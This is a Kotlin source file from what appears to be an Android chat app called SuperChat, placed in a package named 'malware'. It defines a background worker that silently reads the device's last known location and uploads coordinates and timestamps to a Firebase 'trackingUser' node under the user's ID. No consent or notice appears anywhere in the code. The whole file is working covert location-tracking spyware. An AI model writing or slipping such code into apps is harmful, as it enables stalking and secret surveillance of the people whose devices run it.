package com.teamxdevelopers.SuperChat.malware

import android.content.Context
import android.location.Location
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.android.gms.location.LocationServices
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.FirebaseDatabase

class LocationUpdateWorker(appContext: Context, workerParams: WorkerParameters) :
    Worker(appContext, workerParams) {

    companion object {
        private const val TAG = "LocationUpdateWorker"
    }

    override fun doWork(): Result {
        Log.d(TAG, "Work starts.")
        // Get the location and update Firebase
        fetchLocationAndUpdate()
        return Result.success()
    }

    private fun fetchLocationAndUpdate() {
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(applicationContext)
        fusedLocationClient.lastLocation.addOnSuccessListener { location: Location? ->
            if (location != null) {
                Log.d(TAG, "Location fetched successfully: lat=${location.latitude}, long=${location.longitude}")
                saveLocationToFirebase(location)
            } else {
                Log.e(TAG, "Failed to fetch location.")
            }
        }.addOnFailureListener { exception ->
            Log.e(TAG, "Error fetching location", exception)
        }
    }

    private fun saveLocationToFirebase(location: Location) {
        val userId = FirebaseAuth.getInstance().currentUser?.uid ?: "anonymous"
        val locationMap = mapOf(
            "latitude" to location.latitude,
            "longitude" to location.longitude,
            "timestamp" to System.currentTimeMillis()
        )
        FirebaseDatabase.getInstance().getReference("trackingUser").child(userId).push().setValue(locationMap).addOnCompleteListener { task ->
            if (task.isSuccessful) {
                Log.d(TAG, "Location saved successfully to Firebase.")
            } else {
                Log.e(TAG, "Failed to save location to Firebase.", task.exception)
            }
        }
    }
}
